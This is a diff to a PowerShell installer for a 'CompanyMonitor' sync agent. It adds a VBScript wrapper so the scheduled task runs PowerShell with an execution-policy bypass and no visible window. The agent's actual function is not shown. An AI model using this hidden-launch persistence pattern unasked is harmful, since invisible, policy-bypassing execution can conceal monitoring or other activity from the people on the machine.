@@ -19,6 +19,7 @@ $appDir = Join-Path $env:ProgramData "CompanyMonitor"
 $agentPath = Join-Path $appDir "sync_agent.ps1"
 $configPath = Join-Path $appDir "config.json"
 $runnerPath = Join-Path $appDir "run-sync.ps1"
+$hiddenRunnerPath = Join-Path $appDir "run-sync-hidden.vbs"
 $taskName = "CompanyMonitorSync"
 
 New-Item -ItemType Directory -Force -Path $appDir | Out-Null
@@ -41,7 +42,13 @@ Set-Location '$appDir'
 "@
 Set-Content -Path $runnerPath -Value $runner -Encoding UTF8
 
-$taskCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$runnerPath`""
+$hiddenRunner = @"
+Set shell = CreateObject("WScript.Shell")
+shell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$runnerPath""", 0, False
+"@
+Set-Content -Path $hiddenRunnerPath -Value $hiddenRunner -Encoding ASCII
+
+$taskCommand = "wscript.exe ""$hiddenRunnerPath"""
 cmd.exe /c "schtasks /Query /TN ""$taskName"" >nul 2>&1"
 if ($LASTEXITCODE -eq 0) {
     cmd.exe /c "schtasks /Delete /TN ""$taskName"" /F >nul 2>&1"
